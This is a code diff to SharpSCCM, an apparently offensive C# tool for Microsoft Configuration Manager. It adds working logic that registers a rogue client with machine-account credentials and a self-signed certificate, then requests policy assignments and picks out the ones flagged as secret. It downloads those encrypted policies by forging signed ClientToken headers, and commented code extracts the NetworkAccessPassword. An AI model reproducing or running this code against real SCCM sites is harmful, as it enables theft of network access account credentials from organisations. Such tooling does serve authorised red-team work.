@@ -1,11 +1,18 @@
 ﻿using System;
+using System.IO;
 using System.Net;
+using System.Net.Http;
+using System.Net.Http.Headers;
+using System.Reflection;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
+using System.Text;
+using System.Threading.Tasks;
 using System.Xml;
 
 // Configuration Manager SDK
 using Microsoft.ConfigurationManagement.Messaging.Framework;
+using Microsoft.ConfigurationManagement.Messaging.Framework.Interop;
 using Microsoft.ConfigurationManagement.Messaging.Messages;
 using Microsoft.ConfigurationManagement.Messaging.Sender.Http;
 
@@ -43,7 +50,7 @@ namespace SharpSCCM
             return certificate;
         }
 
-        public static void GetNetworkAccessAccounts(string server, string sitecode, string method, string machine = null, string password = null)
+        public static async void GetNetworkAccessAccounts(string server, string sitecode, string method, string computer = null, string password = null)
         {
             // HTTP sender is used for sending messages to the MP
             HttpSender sender = new HttpSender();
@@ -51,9 +58,10 @@ namespace SharpSCCM
             // Register a new client
             // Use NTLM authentication for the specified machine account to automatically approve the new device record, allowing secret policy retrieval
             MessageCertificateX509 certificate = CreateUserCertificate();
+            // Using a certificate store because Microsoft.ConfigurationManagement.Messaging.Framework.Interop.Internal.DecryptMessage does not support the use of volatile certificates
+            //MessageCertificateX509 certificate = MessageCertificateX509.CreateAndStoreSelfSignedCertificate("ConfigMgr Client Signing and Encryption", "ConfigMgr Client Signing and Encryption", "Personal", StoreLocation.CurrentUser, new [] {"1.3.6.1.4.1.311.101.2", "1.3.6.1.4.1.311.101"}, DateTime.Now, DateTime.Now.AddMonths(6));
             string authenticationType = "Windows";
-            SmsClientId clientId = RegisterClient(certificate, null, server, sitecode, authenticationType, machine, password);
-            //SendDDR(certificate, null, server, sitecode, clientId);
+            SmsClientId clientId = RegisterClient(certificate, null, server, sitecode, authenticationType, computer, password);
 
             // Send request for policy assignments to obtain policy locations
             ConfigMgrPolicyAssignmentRequest assignmentRequest = new ConfigMgrPolicyAssignmentRequest();
@@ -69,38 +77,84 @@ namespace SharpSCCM
             assignmentRequest.SiteCode = sitecode;
             assignmentRequest.SerializeMessageBody();
             Console.WriteLine($"[+] Obtaining {assignmentRequest.RequestType} {assignmentRequest.ResourceType} policy assignment from {assignmentRequest.Settings.HostName} {assignmentRequest.SiteCode}");
-            //Console.WriteLine($"\n[+] Policy assignment request body:\n{System.Xml.Linq.XElement.Parse("<root>" + assignmentRequest.Body + "</root>")}");
+            Console.WriteLine($"\n[+] Policy assignment request body:\n{System.Xml.Linq.XElement.Parse("<root>" + assignmentRequest.Body + "</root>")}");
             ConfigMgrPolicyAssignmentReply assignmentReply = assignmentRequest.SendMessage(sender);
-            //Console.WriteLine($"\n[+] Policy assignment reply body:\n {assignmentReply.Body}");
+            Console.WriteLine($"[+] Found {assignmentReply.ReplyAssignments.PolicyAssignments.Count} policy assignments");
 
-            // Send request to download the body of the assigned policies
-            ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply);
+            // Can't figure out how to authenticate with the SDK so using raw HTTP requests
+            foreach (PolicyAssignment policyAssignment in assignmentReply.ReplyAssignments.PolicyAssignments)
+            {
+                if (policyAssignment.Policy.Flags.ToString().Contains("Secret"))
+                {
+                    Console.WriteLine("[+] Found policy containing secrets:");
+                    Console.WriteLine($"    ID: {policyAssignment.Policy.Id}");
+                    Console.WriteLine($"    Flags: {policyAssignment.Policy.Flags}");
+                    Console.WriteLine($"    URL: {policyAssignment.Policy.Location.Value}");
+
+                    string policyURL = policyAssignment.Policy.Location.Value.Replace("<mp>", server);
+                    HttpResponseMessage policyDownloadResponse = SendPolicyDownloadRequest(policyURL, clientId.ToString(), certificate);
+                    string policyDownloadResponseEncryptedText = await policyDownloadResponse.Content.ReadAsStringAsync();
+                    Console.WriteLine($"[+] Received encrypted secret policy from server:\n    {policyDownloadResponseEncryptedText}");
+
+                    Console.WriteLine("---");
+                    /*
+                    ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply, policyAssignment);
+                    policyDownloadRequest.AddCertificateToMessage(certificate,
+                        CertificatePurposes.Signing | CertificatePurposes.Encryption);
+                    policyDownloadRequest.DownloadSecrets = true;
+                    policyDownloadRequest.ForceSmsIdSignature = true;
+                    //Console.WriteLine($"[+] Headers:\n    {policyDownloadRequest.Settings.SenderProperties["HttpHeaders"]}");
+                    ConfigMgrPolicyBodyDownloadReply policyDownloadReply = policyDownloadRequest.SendMessage(sender);
+                    foreach (PolicyBody policyBody in policyDownloadReply.ReplyPolicyBodies)
+                    {
+                        Console.WriteLine(policyBody.RawPolicyText);
+                    }
+                    */
+                }
+            }
+            
+            //Console.WriteLine($"[+] Policy assignment reply body:\n {assignmentReply.Body}");
+
+            // Create request to download the body of the assigned policies
+            // Reflection required to access internal method
+            //ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply);
+            //MethodInfo SetCustomHeader = typeof(ConfigMgrPolicyBodyDownloadRequest).GetMethod("SetCustomHeader", BindingFlags.Instance | BindingFlags.NonPublic);
+            //policyDownloadRequest = Activator.CreateInstance(typeof(ConfigMgrPolicyBodyDownloadRequest));
+            //SetCustomHeader.Invoke(policyDownloadRequest, new object[] { assignmentReply.Settings, clientId, certificate });
+            //MethodInfo SendMessage = typeof(ConfigMgrPolicyBodyDownloadRequest).GetMethod("SendMessage", BindingFlags.Instance | BindingFlags.NonPublic);
+            //ConfigMgrPolicyBodyDownloadReply policyDownloadReply = (ConfigMgrPolicyBodyDownloadReply)SendMessage.Invoke((ConfigMgrPolicyBodyDownloadRequest)policyDownloadRequest, new object[] { sender });
+
+            //ConfigMgrPolicyBodyDownloadRequest policyDownloadRequest = new ConfigMgrPolicyBodyDownloadRequest(assignmentReply);
 
             // Add our certificate for message signing and encryption
-            policyDownloadRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);
+            //policyDownloadRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);
 
             // Discover local properties and configure message settings
-            policyDownloadRequest.Discover();
-            policyDownloadRequest.SmsId = clientId;
-            policyDownloadRequest.DownloadSecrets = true;
-            policyDownloadRequest.Settings.HostName = server;
-            policyDownloadRequest.Settings.Compression = MessageCompression.Zlib;
-            policyDownloadRequest.Settings.ReplyCompression = MessageCompression.Zlib;
-            policyDownloadRequest.SiteCode = sitecode;
-            policyDownloadRequest.ForceSmsIdSignature = true;
-            policyDownloadRequest.SerializeMessageBody();
-            System.Threading.Thread.Sleep(10000);
-            Console.WriteLine($"[+] Sending policy download request to {policyDownloadRequest.Settings.HostName}:{policyDownloadRequest.SiteCode}");
+            //policyDownloadRequest.Discover();
+            //policyDownloadRequest.SmsId = clientId;
+            //policyDownloadRequest.DownloadSecrets = true;
+            //policyDownloadRequest.Settings.HostName = server;
+            //policyDownloadRequest.Settings.Compression = MessageCompression.Zlib;
+            //policyDownloadRequest.Settings.ReplyCompression = MessageCompression.Zlib;
+            //policyDownloadRequest.SiteCode = sitecode;
+            //policyDownloadRequest.ForceSmsIdSignature = true;
+            //policyDownloadRequest.SerializeMessageBody();
+
+            //Console.WriteLine($"[+] Sending policy download request to {policyDownloadRequest.Settings.HostName}:{policyDownloadRequest.SiteCode}");
             //Console.WriteLine($"[+] Policy request body:\n{System.Xml.Linq.XElement.Parse("<root>" + policyDownloadRequest.Body + "</root>")}");
             //foreach (var attachment in policyDownloadRequest.Attachments)
             //{
             //    Console.WriteLine(attachment.Body);
             //}
-            ConfigMgrPolicyBodyDownloadReply policyDownloadReply = policyDownloadRequest.SendMessage(sender);
+
+            
+            //ConfigMgrPolicyBodyDownloadReply policyDownloadReply = policyDownloadRequest.SendMessage(sender);
+            /*
             Console.WriteLine("\n[+] Policy download reply body:\n");
+            
             foreach (PolicyBody policyBody in policyDownloadReply.ReplyPolicyBodies)
             {
-                //Console.WriteLine(policyBody.RawPolicyText);
+                Console.WriteLine(policyBody.RawPolicyText);
                 if (policyBody.RawPolicyText.Contains("NetworkAccess"))
                 {
                     XmlDocument policyXmlDoc = new XmlDocument();
@@ -111,6 +165,7 @@ namespace SharpSCCM
                     Console.WriteLine($"\n[+] Encrypted NetworkAccessPassword: {encryptedPassword}");
                 }
             }
+            */
         }
 
         public static MessageCertificateX509 GetSigningCertificate()
@@ -120,7 +175,7 @@ namespace SharpSCCM
             return certificate;
         }
 
-        public static SmsClientId RegisterClient(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, string authenticationType = null, string machine = null, string password = null)
+        public static SmsClientId RegisterClient(MessageCertificateX509 certificate, string target, string managementPoint, string siteCode, string authenticationType = null, string computer = null, string password = null)
         {
             // HTTP sender is used for sending messages to the MP
             HttpSender sender = new HttpSender();
@@ -129,7 +184,7 @@ namespace SharpSCCM
             ConfigMgrRegistrationRequest registrationRequest = new ConfigMgrRegistrationRequest();
 
             // Add our certificate for message signing
-            registrationRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing);
+            registrationRequest.AddCertificateToMessage(certificate, CertificatePurposes.Signing | CertificatePurposes.Encryption);
 
             // Discover local properties for client registration request
             Console.WriteLine("[+] Discovering local properties for client registration request");
@@ -143,8 +198,8 @@ namespace SharpSCCM
                 registrationRequest.ClientFqdn = target;
                 registrationRequest.NetBiosName = target;
             }
-            Console.WriteLine($"  ClientFqdn: {registrationRequest.ClientFqdn}"); // Original ClientFqdn derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName + <domain name>
-            Console.WriteLine($"  NetBiosName: {registrationRequest.NetBiosName}"); // Original NetBiosName derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName
+            Console.WriteLine($"    ClientFqdn: {registrationRequest.ClientFqdn}"); // Original ClientFqdn derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName + <domain name>
+            Console.WriteLine($"    NetBiosName: {registrationRequest.NetBiosName}"); // Original NetBiosName derived from HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\ComputerName\ActiveComputerName\ComputerName
             registrationRequest.Settings.HostName = managementPoint;
             registrationRequest.Settings.Compression = MessageCompression.Zlib;
             registrationRequest.Settings.ReplyCompression = MessageCompression.Zlib;
@@ -152,13 +207,13 @@ namespace SharpSCCM
             if (authenticationType == "Windows")
             {
                 registrationRequest.Settings.Security.AuthenticationType = AuthenticationType.WindowsAuth;
-                if (!string.IsNullOrEmpty(machine) && !string.IsNullOrEmpty(password))
+                if (!string.IsNullOrEmpty(computer) && !string.IsNullOrEmpty(password))
                 {
-                    Console.WriteLine($"  Using machine account: {machine}");
-                    registrationRequest.Settings.Security.Credentials = new NetworkCredential(machine, password);
+                    Console.WriteLine($"    Using machine account: {computer}");
+                    registrationRequest.Settings.Security.Credentials = new NetworkCredential(computer, password);
                 }
             }
-            Console.WriteLine($"  SiteCode: {registrationRequest.SiteCode}");
+            Console.WriteLine($"    SiteCode: {registrationRequest.SiteCode}");
 
             // Serialize message XML and display to user
             registrationRequest.SerializeMessageBody();
@@ -250,6 +305,32 @@ namespace SharpSCCM
             Console.WriteLine($"[+] Sending DDR from {ddrMessage.SmsId} to {ddrMessage.Settings.Endpoint} endpoint on {ddrMessage.Settings.HostName}:{ddrMessage.SiteCode} and requesting client installation on {target}");
             ddrMessage.SendMessage(sender);
             Console.WriteLine("[+] Done!");
+        }
+
+        public static HttpResponseMessage SendPolicyDownloadRequest(string url, string clientId = "", MessageCertificateX509 certificate = null)
+        {
+            HttpClientHandler httpClientHandler = new HttpClientHandler() { AutomaticDecompression = DecompressionMethods.GZip | DecompressionMethods.Deflate };
+            HttpClient httpClient = new HttpClient(httpClientHandler);
+            httpClient.DefaultRequestHeaders.Add("User-Agent", "ConfigMgr Messaging HTTP Sender");
+            httpClient.DefaultRequestHeaders.Add("Accept", "*/*");
+            httpClient.DefaultRequestHeaders.ConnectionClose = true;
+            var request = new HttpRequestMessage(HttpMethod.Get, url);
+            if (!string.IsNullOrEmpty(clientId) && (certificate != null))
+            {
+                string currentTimeAsIso = TimeHelpers.CurrentTimeAsIso8601;
+                string clientTokenHeader = $"{clientId};{currentTimeAsIso};2";
+                httpClient.DefaultRequestHeaders.Add("ClientToken", clientTokenHeader);
+                byte[] clientTokenHeaderBytes = Encoding.Unicode.GetBytes(clientTokenHeader + "\0");
+                string clientTokenSignatureHeader = certificate.Sign(clientTokenHeaderBytes, "SHA256", MessageCertificateSigningOptions.CryptNoHashId).HexBinaryEncode().ToUpperInvariant();
+                Console.WriteLine("[+] Adding authentication headers to message\n" +
+                                  $"    ClientToken: {clientTokenHeader}\n" +
+                                  $"    ClientTokenSignature: {clientTokenSignatureHeader}"
+                                  );
+                httpClient.DefaultRequestHeaders.Add("ClientTokenSignature", clientTokenSignatureHeader);
+            }
+
+            var response = httpClient.SendAsync(request).Result;
+            return response;
         }
     }
 }
